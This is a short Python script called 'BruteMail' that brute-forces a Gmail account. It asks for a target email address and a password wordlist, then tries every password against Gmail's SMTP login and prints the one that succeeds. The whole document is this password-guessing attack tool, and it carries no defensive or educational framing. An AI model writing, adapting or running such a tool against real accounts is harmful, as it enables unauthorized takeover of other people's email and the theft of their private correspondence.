#!/usr/bin/python3

import smtplib
from termcolor import colored
from art import *

smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
smtpServer.ehlo()
smtpServer.starttls()

print(colored(text2art ("BruteMail"), 'cyan'))
print(colored('Created by ByteVigilante\n\n'.center(60),'red'))

user = input("Enter Target Email Address: ")
file = input("Enter Path to Password File: ")
passwordFile = open(file, "r")

for password in passwordFile:
    password = password.strip('\n')
    try:
        smtpServer.login(user, password)
        print(colored('[+] Password Found: %s' % password, "green")) 
    except smtplib.SMTPAuthenticationError:
        print(colored('[-] Wrong Password: %s' % password, "red"))
